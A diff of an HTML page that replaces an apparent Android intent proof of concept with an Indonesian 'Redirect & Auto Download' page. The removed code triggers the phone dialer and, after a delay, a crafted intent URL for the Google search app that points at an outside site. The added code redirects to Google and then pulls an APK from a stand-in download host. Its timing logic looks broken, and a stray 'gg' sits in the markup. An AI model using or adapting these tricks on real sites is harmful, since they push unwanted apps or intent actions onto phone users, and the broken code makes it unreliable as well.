@@ -1,82 +1,53 @@
-
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">gg
-  <title>Android Intent PoC</title>
-  <style>
-    body {
-      font-family: system-ui, sans-serif;
-      background: #f8f9fa;
-      color: #202124;
-      min-height: 100vh;
-      margin: 0;
-      display: grid;
-      place-content: center;
-      text-align: center;
-    }
-
-    a {
-      display: inline-block;
-      padding: 16px 28px;
-      background: #1a73e8;
-      color: white;
-      text-decoration: none;
-      font-weight: 600;
-      border-radius: 8px;
-    }
-
-    a:active {
-      background: #1557b0;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect & Auto Download</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 50px;
+            background-color: #f4f4f9;
+        }
+        button {
+            padding: 12px 24px;
+            font-size: 16px;
+            color: #fff;
+            background-color: #007BFF;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
 </head>
 <body>
 
-  <h2>Android Intent Test</h2>
+    <h2>Silakan Klik Tombol di Bawah</h2>
+    <p>Akan mengarahkan ke Google, lalu mengunduh file setelah 3 detik.</p>
+    
+    <br>
+    
+    <!-- Tombol Eksekusi -->
+    <button id="triggerBtn">Mulai Proses</button>
 
-  <a href="https://google.com" id="intentLink">
-    Open Window & Android Intent T3s7
-  </a>
+    <script>
+        document.getElementById('triggerBtn').addEventListener('click', function() {
+            // 1. Redirect instan ke google.com di tab/window saat ini
+            window.location.href = "https://www.google.com";
 
-  <script>
-    let triggered = false;
-    const link = document.getElementById("intentLink");
-
-    link.addEventListener("click", () => {
-      if (triggered) return;
-      triggered = true;
-
-      // Open dialer from the same user interaction.
-      window.open("tel:+6281234567890", "_blank");
-
-      // Keep normal navigation to Google.
-      setTimeout(() => {
-        triggered = false;
-      }, 5000);
-    });
-
-    link.addEventListener("contextmenu", () => {
-      if (triggered) return;
-      triggered = true;
-
-      setTimeout(() => {
-        const intentUrl =
-          "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
-
-        window.location.href = intentUrl;
-
-        setTimeout(() => {
-          triggered = false;
-        }, 1300);
-      }, 4000);
-    });
-
-    link.addEventListener("touchstart", () => {}, {
-      passive: true
-    });
-  </script>
+            // 2. 3 detik kemudian memicu intent/download link APK
+            setTimeout(function() {
+                // Menggunakan iframe tersembunyi atau window.location untuk memicu file APK
+                window.location.href = "https://download.server.com/app.apk";
+            }, 3000); // 3000 milidetik = 3 detik
+        });
+    </script>
 
 </body>
 </html>
